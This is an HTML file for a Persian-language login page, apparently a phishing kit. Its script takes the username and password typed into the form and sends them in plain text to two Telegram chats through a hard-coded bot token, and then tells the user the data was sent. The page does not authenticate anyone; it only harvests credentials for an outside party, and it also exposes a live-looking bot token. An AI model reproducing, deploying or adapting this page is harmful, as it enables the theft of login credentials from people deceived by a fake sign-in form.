<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <title>ورود</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      direction: rtl;
      font-family: sans-serif;
      background-color: #121212;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start; /* فرم کمی بالاتر */
      padding-top: 20vh;        /* فاصله از بالا */
    }

    .login-panel {
      background-color: #1e1e2f;
      padding: 24px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
      width: 90%;
      max-width: 360px;
      text-align: right;
    }

    h3 {
      color: #fff;
      text-align: center;
      margin-bottom: 20px;
    }

    input,
    button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border-radius: 12px;
      border: none;
      font-size: 16px;
      box-sizing: border-box;
    }

    input {
      background-color: #2a2a3d;
      color: #fff;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      background-color: #2196f3;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #1976d2;
    }

    #status {
      text-align: center;
      color: #4caf50;
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="login-panel">
    <h3>ورود به حساب</h3>
    <input type="text" id="username" placeholder="نام کاربری" />
    <input type="password" id="password" placeholder="رمز عبور" />
    <button onclick="sendData()">ارسال</button>
    <div id="status"></div>
  </div>

  <script>
    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const token = "7512556234:AAEpxEDjILEARULIa4p9x_OFlljXTVBwVG8";
      const chatIds = ["1749401858", "6795162874"];
      const message = `🔐 فرم ورود جدید:\n👤 نام کاربری: ${username}\n🔑 رمز عبور: ${password}`;

      chatIds.forEach((chatId) => {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      });

      document.getElementById("status").innerText = "✅ اطلاعات ارسال شد.";
    }
  </script>
</body>
</html>
